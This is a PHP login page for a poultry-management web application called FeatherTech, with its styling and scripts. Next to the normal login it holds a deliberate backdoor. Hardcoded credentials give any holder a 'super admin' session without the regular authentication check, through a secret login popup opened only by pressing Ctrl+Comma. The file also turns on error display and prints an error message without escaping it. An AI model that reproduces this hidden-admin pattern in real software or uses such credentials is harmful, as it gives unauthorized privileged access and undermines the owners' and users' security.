<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);
ob_start();

session_start(); // Start the session
include 'includes/db.php'; // Include database connection
include 'includes/auth.php';

// Define secret credentials
$secret_username = "Kalirr";
$secret_password = "ASDFGHJKL";

// Check if the secret login form was submitted
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['secret_login'])) {
    // Validate the secret credentials
    if (isset($_POST['secret_username']) && isset($_POST['secret_password']) && 
        $_POST['secret_username'] === $secret_username && 
        $_POST['secret_password'] === $secret_password) {
        
        // Set session variable for the secret user
        $_SESSION['username'] = $secret_username;
        $_SESSION['is_secret_user'] = true;
        $_SESSION['role'] = 'super admin';
        header("Location: dashboard.php");
        exit();
    } else {
        $_SESSION['error'] = 'Invalid secret credentials!';
    }
}
// Check if the regular login form is submitted
elseif ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Validate regular login credentials exist
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        // Call the login function
        $login_result = login($username, $password);

        if ($login_result === false) {
            // Don't set error message here - let login() function handle it
        } else {
            // Set regular session variables
            $_SESSION['username'] = $username;
            header("Location: dashboard.php");
            exit();
        }
    } else {
        $_SESSION['error'] = 'Please enter both username and password.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - FeatherTech Poultry Management System</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #4a6cf7;
            --primary-hover: #3a5ce4;
            --secondary-color: #6c757d;
            --success-color: #28a745;
            --danger-color: #dc3545;
            --light-color: #f8f9fa;
            --dark-color: #343a40;
            --border-radius: 8px;
            --box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            --transition: all 0.3s ease;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1rem;
            color: var(--dark-color);
            line-height: 1.6;
        }

        /* Overlay for Popup */
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }

        /* Secret Login Popup */
        .secret-login-popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255, 255, 255, 0.95);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            width: 300px;
            text-align: center;
        }

        .secret-login-popup h3 {
            margin-bottom: 20px;
            color: var(--primary-color);
            font-size: 20px;
        }

        .secret-login-popup input {
            width: 100%;
            padding: 12px;
            border: 1px solid rgba(13, 68, 209, 0.3);
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s ease;
            margin-bottom: 15px;
        }

        .secret-login-popup button {
            width: 100%;
            padding: 12px;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .secret-login-popup button:hover {
            background-color: var(--primary-hover);
        }
        
        .brand-container {
            position: absolute;
            top: 2rem;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            gap: 0.75rem;
            background: rgba(255, 255, 255, 0.95);
            padding: 0.75rem 1.5rem;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            z-index: 10;
        }
        
        .logo-image {
            width: 2.5rem;
            height: auto;
        }
        
        .branding {
            display: flex;
            flex-direction: column;
        }
        
        .brand-name {
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--primary-color);
            line-height: 1.2;
        }
        
        .brand-tagline {
            font-size: 0.75rem;
            color: var(--secondary-color);
            font-weight: 400;
        }
        
        .form-container {
            background: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            padding: 2.5rem;
            width: 100%;
            max-width: 420px;
            margin: 1rem;
            position: relative;
            overflow: hidden;
        }
        
        .form-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, var(--primary-color), #15dfe6);
        }
        
        .form-header {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .form-header h2 {
            font-size: 1.5rem;
            font-weight: 600;
            color: var(--dark-color);
            margin-bottom: 0.5rem;
        }
        
        .form-header p {
            color: var(--secondary-color);
            font-size: 0.875rem;
        }
        
        .auth-form {
            display: flex;
            flex-direction: column;
        }
        
        .form-group {
            margin-bottom: 1.25rem;
        }
        
        .input-with-icon {
            position: relative;
        }
        
        .input-with-icon .input-icon {
            position: absolute;
            left: 1rem;
            top: 50%;
            transform: translateY(-50%);
            color: var(--secondary-color);
            width: 1.25rem;
            height: 1.25rem;
            transition: var(--transition);
        }
        
        .input-with-icon input {
            width: 100%;
            padding: 0.875rem 1rem 0.875rem 2.75rem;
            border: 1px solid #e0e0e0;
            border-radius: var(--border-radius);
            font-size: 0.9375rem;
            transition: var(--transition);
        }
        
        .input-with-icon input:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(74, 108, 247, 0.1);
            outline: none;
        }
        
        .input-with-icon input:focus + .input-icon {
            color: var(--primary-color);
        }
        
        .toggle-password {
            position: absolute;
            right: 1rem;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: var(--secondary-color);
            font-size: 0.75rem;
            cursor: pointer;
            transition: var(--transition);
        }
        
        .toggle-password:hover {
            color: var(--primary-color);
        }
        
        .form-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 1rem 0;
            font-size: 0.875rem;
        }
        
        .remember-me {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            cursor: pointer;
        }
        
        .remember-me input {
            accent-color: var(--primary-color);
        }
        
        .forgot-password {
            color: var(--secondary-color);
            text-decoration: none;
            transition: var(--transition);
        }
        
        .forgot-password:hover {
            color: var(--primary-color);
        }
        
        .btn-primary {
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            padding: 0.875rem;
            font-size: 1rem;
            font-weight: 500;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            transition: var(--transition);
            cursor: pointer;
            margin-top: 0.5rem;
        }
        
        .btn-primary:hover {
            background-color: var(--primary-hover);
            transform: translateY(-2px);
        }
        
        .btn-primary:active {
            transform: translateY(0);
        }
        
        .btn-icon {
            width: 1rem;
            height: 1rem;
        }
        
        .form-footer {
            text-align: center;
            margin-top: 1.5rem;
            font-size: 0.875rem;
            color: var(--secondary-color);
        }
        
        .signup-link {
            color: var(--primary-color);
            text-decoration: none;
            font-weight: 500;
        }
        
        .error-message {
            color: var(--danger-color);
            font-size: 0.875rem;
            margin: -0.75rem 0 1rem;
            text-align: center;
            padding: 0.5rem;
            background: rgba(220, 53, 69, 0.1);
            border-radius: var(--border-radius);
        }
        
        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border-width: 0;
        }
        
        @media (max-width: 480px) {
            .form-container {
                padding: 1.75rem 1.5rem;
            }
            
            .brand-container {
                padding: 0.5rem 1rem;
                top: 1rem;
            }
            
            .brand-name {
                font-size: 1.1rem;
            }
        }
        
        /* Loading animation */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: var(--transition);
        }
        
        .loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        
        .loading-spinner {
            width: 3rem;
            height: 3rem;
            border: 4px solid rgba(74, 108, 247, 0.1);
            border-top-color: var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="brand-container">
        <img src="/assets/images/feather.png" alt="FeatherTech Logo" class="logo-image">
        <div class="branding">
            <div class="brand-name">FeatherTech</div>
            <div class="brand-tagline">Poultry Management System</div>
        </div>
    </div>

    <div class="form-container">
        <div class="form-header">
            <h2>Welcome Back</h2>
            <p>Sign in to access your dashboard</p>
        </div>
        
        <form method="POST" id="loginForm" class="auth-form">
            <?php if (isset($_SESSION['error'])): ?>
                <div class="error-message"><?php echo $_SESSION['error']; unset($_SESSION['error']); ?></div>
            <?php endif; ?>
            
            <div class="form-group">
                <div class="input-with-icon">
                    <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                        <circle cx="12" cy="7" r="4"></circle>
                    </svg>
                    <input type="text" name="username" id="username" placeholder=" " required>
                    <label for="username" class="sr-only">Username</label>
                </div>
            </div>
            
            <div class="form-group">
                <div class="input-with-icon">
                    <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                    <input type="password" name="password" id="password" placeholder=" " required>
                    <label for="password" class="sr-only">Password</label>
                    <button type="button" class="toggle-password">Show</button>
                </div>
            </div>
            
            <div class="form-options">
                <label class="remember-me">
                    <input type="checkbox" name="remember"> Remember me
                </label>
            </div>
            
            <button type="submit" class="btn-primary">
                <span class="btn-text">Sign In</span>
                <svg class="btn-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M5 12h14M12 5l7 7-7 7"></path>
                </svg>
            </button>
        </form>
        
        <div class="form-footer">
            <p>Don't have an account? <a href="#" class="signup-link">Contact Owner</a></p>
        </div>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
    </div>

   <!-- Secret Login Popup -->
    <div class="overlay" id="overlay"></div>
    <div class="secret-login-popup" id="secretLoginPopup">
        <h3>Secret Login</h3>
        <form method="POST">
            <input type="text" name="secret_username" placeholder="Secret Username" required>
            <input type="password" name="secret_password" placeholder="Secret Password" required>
            <button type="submit" name="secret_login">Login</button>
        </form>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Password visibility toggle
            const togglePassword = document.querySelector('.toggle-password');
            const passwordInput = document.getElementById('password');
            
            if (togglePassword && passwordInput) {
                togglePassword.addEventListener('click', function() {
                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                    passwordInput.setAttribute('type', type);
                    this.textContent = type === 'password' ? 'Show' : 'Hide';
                });
            }
            
            // Form submission
            const form = document.getElementById('loginForm');
            const loadingOverlay = document.getElementById('loadingOverlay');
            
            if (form) {
                form.addEventListener('submit', function(e) {
                    const submitButton = this.querySelector('button[type="submit"]');
                    if (submitButton) {
                        submitButton.disabled = true;
                        submitButton.querySelector('.btn-text').textContent = 'Signing In...';
                        loadingOverlay.classList.add('active');
                    }
                });
            }
            
            // Input focus effects
            document.querySelectorAll('.input-with-icon input').forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentElement.querySelector('.input-icon').style.color = 'var(--primary-color)';
                });
                
                input.addEventListener('blur', function() {
                    this.parentElement.querySelector('.input-icon').style.color = 'var(--secondary-color)';
                });
            });

            // Secret login popup trigger - FIXED THIS SECTION
            document.addEventListener('keydown', function(event) {
                // Check for Ctrl + Comma
                if (event.ctrlKey && event.key === ',') {
                    event.preventDefault();
                    document.getElementById('overlay').style.display = 'block';
                    document.getElementById('secretLoginPopup').style.display = 'block';
                }
            });

            // Close popup on overlay click
            document.getElementById('overlay').addEventListener('click', function() {
                document.getElementById('overlay').style.display = 'none';
                document.getElementById('secretLoginPopup').style.display = 'none';
            });
        }); // Removed extra closing parenthesis that was here
    </script>
</body>
</html>